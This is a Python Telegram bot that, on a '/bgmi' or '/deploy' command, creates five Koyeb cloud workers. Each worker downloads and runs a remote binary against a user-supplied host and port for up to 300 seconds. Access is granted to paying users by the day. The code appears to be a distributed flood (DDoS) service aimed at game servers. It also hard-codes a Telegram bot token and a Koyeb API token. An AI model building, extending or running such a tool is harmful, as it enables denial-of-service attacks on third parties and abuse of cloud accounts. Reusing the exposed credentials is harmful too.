import telebot
import datetime
import os
import time
import logging
import re
import threading
from threading import Lock
import asyncio
import requests
import uuid

# Set up logging
logging.basicConfig(level=logging.INFO)

# =============================================================================
# 🔧 CONFIGURATION
# =============================================================================
OWNER_ID = "7119717262"
BOT_TOKEN = "8265293892:AAEyfiYiMuVW1VEHUrUx0YBg0mvBUkyFPw8"

# Koyeb API Configuration
KOYEB_API_TOKEN = "tece2ovo0rfxyhxlq43do0zzknyxmoia7cijglf8hr161rwk41rkc30l6wu1j9sx"
KOYEB_API_URL = "https://app.koyeb.com/v1"
KOYEB_REGION = "sin"  # Singapore
KOYEB_INSTANCE_TYPE = "small"  # 2 vCPU, 1GB RAM
KOYEB_INSTANCE_COUNT = 5  # Number of worker instances

# Global Constants
MAX_SESSION_DURATION = 300
USER_ACCESS_FILE = "user_access.txt"

bot = telebot.TeleBot(BOT_TOKEN)
# =============================================================================

# State Management
user_access = {}
active_sessions = []
sessions_lock = Lock()

def load_user_access():
    if not os.path.exists(USER_ACCESS_FILE): return {}
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                parts = line.strip().split(",")
                if len(parts) >= 2:
                    uid, exp = parts[0], parts[-1]
                    access[uid] = datetime.datetime.fromisoformat(exp)
            return access
    except Exception as e:
        logging.error(f"Error loading access: {e}")
        return {}

def save_user_access():
    try:
        with open(USER_ACCESS_FILE, "w") as file:
            for uid, exp in user_access.items():
                file.write(f"{uid},{exp.isoformat()}\n")
    except Exception as e:
        logging.error(f"Error saving access: {e}")

# Koyeb API Functions
def koyeb_headers():
    return {
        "Authorization": f"Bearer {KOYEB_API_TOKEN}",
        "Content-Type": "application/json"
    }

def get_koyeb_app_id():
    """Get or create the Koyeb app for worker services"""
    try:
        # List apps to find existing one
        resp = requests.get(f"{KOYEB_API_URL}/apps", headers=koyeb_headers())
        if resp.status_code == 200:
            apps = resp.json().get("apps", [])
            for app in apps:
                if app.get("name") == "distributed-workers":
                    return app.get("id")
        
        # Create new app if not exists
        resp = requests.post(
            f"{KOYEB_API_URL}/apps",
            headers=koyeb_headers(),
            json={"name": "distributed-workers"}
        )
        if resp.status_code in [200, 201]:
            return resp.json().get("app", {}).get("id")
        logging.error(f"Failed to create app: {resp.status_code} - {resp.text}")
        return None
    except Exception as e:
        logging.error(f"Error getting app ID: {e}")
        return None

def create_worker_service(app_id, host, port, duration, worker_num):
    """Create a single worker service on Koyeb"""
    service_name = f"worker-{uuid.uuid4().hex[:8]}"
    
    # Use Ubuntu 24.04 for GLIBC 2.39 (binary requires GLIBC 2.38)
    # Ubuntu comes with curl pre-installed
    run_command = f"curl -L -o /tmp/port https://github.com/Sagar-xs69/distributed-bot-manager/raw/main/port && chmod +x /tmp/port && /tmp/port {host} {port} {duration} 900"
    
    # Correct Koyeb API payload structure
    payload = {
        "app_id": app_id,
        "definition": {
            "name": service_name,
            "type": "WORKER",
            "regions": [KOYEB_REGION],
            "instance_types": [{"type": KOYEB_INSTANCE_TYPE}],
            "scalings": [{"min": 1, "max": 1}],
            "docker": {
                "image": "ubuntu:24.04",
                "command": run_command,
                "entrypoint": ["/bin/bash", "-c"]
            }
        }
    }
    
    try:
        # Correct endpoint: /v1/services (not /v1/apps/{id}/services)
        resp = requests.post(
            f"{KOYEB_API_URL}/services",
            headers=koyeb_headers(),
            json=payload
        )
        if resp.status_code in [200, 201]:
            service = resp.json().get("service", {})
            logging.info(f"Created worker service: {service.get('id')}")
            return service.get("id")
        else:
            logging.error(f"Failed to create service: {resp.status_code} - {resp.text}")
            return None
    except Exception as e:
        logging.error(f"Error creating worker service: {e}")
        return None

def delete_worker_service(service_id):
    """Delete a worker service from Koyeb"""
    try:
        resp = requests.delete(
            f"{KOYEB_API_URL}/services/{service_id}",
            headers=koyeb_headers()
        )
        if resp.status_code in [200, 204]:
            logging.info(f"Deleted worker service: {service_id}")
            return True
        else:
            logging.error(f"Failed to delete service: {resp.status_code}")
            return False
    except Exception as e:
        logging.error(f"Error deleting worker service: {e}")
        return False

def cleanup_workers(service_ids, delay):
    """Background task to delete workers after delay"""
    time.sleep(delay)
    for sid in service_ids:
        delete_worker_service(sid)
    logging.info(f"Cleaned up {len(service_ids)} worker services")

# Async Setup for Countdowns
async_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_async_loop, args=(async_loop,), daemon=True).start()

async def async_update_countdown(message, msg_id, start_time, duration, host, port, session_info, worker_count):
    end_time = start_time + datetime.timedelta(seconds=duration)
    while True:
        remaining = (end_time - datetime.datetime.now()).total_seconds()
        if remaining <= 0: break
        try:
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg_id,
                text=f"🚀 <b>DEPLOYMENT ACTIVE</b> 🚀\n\n🛰 Workers: <code>{worker_count}</code>\n💻 Host: <code>{host}</code>\n📡 Port: <code>{port}</code>\n⏳ Timer: <code>{int(remaining)}s</code>\n📍 Region: <code>Singapore</code>\n⚔️ Status: <b>Active</b>",
                parse_mode='HTML'
            )
        except: pass
        await asyncio.sleep(1.5)
    
    try:
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=f"✅ <b>SESSION COMPLETED</b>\n💻 Host: <code>{host}</code>\n📡 Port: <code>{port}</code>\n🧹 Workers: <code>Terminated</code>", parse_mode='HTML')
    except: pass
    
    with sessions_lock:
        if session_info in active_sessions: active_sessions.remove(session_info)

# Initial Load
user_access = load_user_access()

# =============================================================================
# 🚀 CORE COMMAND HANDLERS
# =============================================================================

@bot.message_handler(commands=['bgmi', 'deploy'])
def handle_bgmi(message):
    caller_id = str(message.from_user.id)
    
    if caller_id != OWNER_ID:
        if caller_id not in user_access or user_access[caller_id] < datetime.datetime.now():
            bot.reply_to(message, "❌ Access Restricted.")
            return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: `/deploy <host> <port> <time>`", parse_mode='Markdown')
        return

    host, port, duration = command[1], command[2], int(command[3])

    if duration > MAX_SESSION_DURATION:
        bot.reply_to(message, f"⚠️ Max session limit is {MAX_SESSION_DURATION}s")
        return

    # Send initial message
    msg = bot.send_message(
        message.chat.id, 
        f"⚡️ Initializing {KOYEB_INSTANCE_COUNT} workers in Singapore...", 
        parse_mode='HTML'
    )
    
    # Get or create Koyeb app
    app_id = get_koyeb_app_id()
    if not app_id:
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text="❌ Failed to initialize Koyeb app."
        )
        return
    
    # Create worker services
    service_ids = []
    for i in range(KOYEB_INSTANCE_COUNT):
        sid = create_worker_service(app_id, host, port, duration, i)
        if sid:
            service_ids.append(sid)
    
    if not service_ids:
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text="❌ Failed to create any worker services."
        )
        return
    
    # Schedule cleanup
    cleanup_thread = threading.Thread(
        target=cleanup_workers, 
        args=(service_ids, duration + 30),  # Extra 30s buffer
        daemon=True
    )
    cleanup_thread.start()
    
    session_info = {
        'end_time': datetime.datetime.now() + datetime.timedelta(seconds=duration),
        'service_ids': service_ids
    }
    active_sessions.append(session_info)
    
    # Start countdown
    asyncio.run_coroutine_threadsafe(
        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, host, port, session_info, len(service_ids)),
        async_loop
    )

@bot.message_handler(commands=['stop_session'])
def stop_session(message):
    if str(message.from_user.id) != OWNER_ID: return
    
    terminated = 0
    with sessions_lock:
        for session in active_sessions:
            for sid in session.get('service_ids', []):
                if delete_worker_service(sid):
                    terminated += 1
        active_sessions.clear()
    
    bot.reply_to(message, f"🛑 Terminated {terminated} worker services.")

@bot.message_handler(commands=['grant'])
def grant(message):
    if str(message.from_user.id) != OWNER_ID: return
    cmd = message.text.split()
    if len(cmd) < 3: return
    
    uid = cmd[1]
    try:
        days = int(re.search(r'\d+', cmd[2]).group())
    except:
        bot.reply_to(message, "Invalid syntax. Use e.g., 30d")
        return
        
    user_access[uid] = datetime.datetime.now() + datetime.timedelta(days=days)
    save_user_access()
    bot.reply_to(message, f"✅ User {uid} granted system access for {days} days.")

@bot.message_handler(commands=['start', 'help'])
def help_cmd(message):
    help_text = (
        "🚀 <b>Dynamic Deployment Console</b>\n\n"
        "<b>Commands:</b>\n"
        "/deploy &lt;host&gt; &lt;port&gt; &lt;time&gt; - Deploy to 5 workers\n"
        "/stop_session - Terminate all workers\n"
        "/grant &lt;id&gt; &lt;days&gt; - Grant access\n\n"
        f"<b>Config:</b>\n"
        f"📍 Region: Singapore\n"
        f"🖥 Instances: {KOYEB_INSTANCE_COUNT}x {KOYEB_INSTANCE_TYPE}"
    )
    bot.reply_to(message, help_text, parse_mode='HTML')

# Polling Loop
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
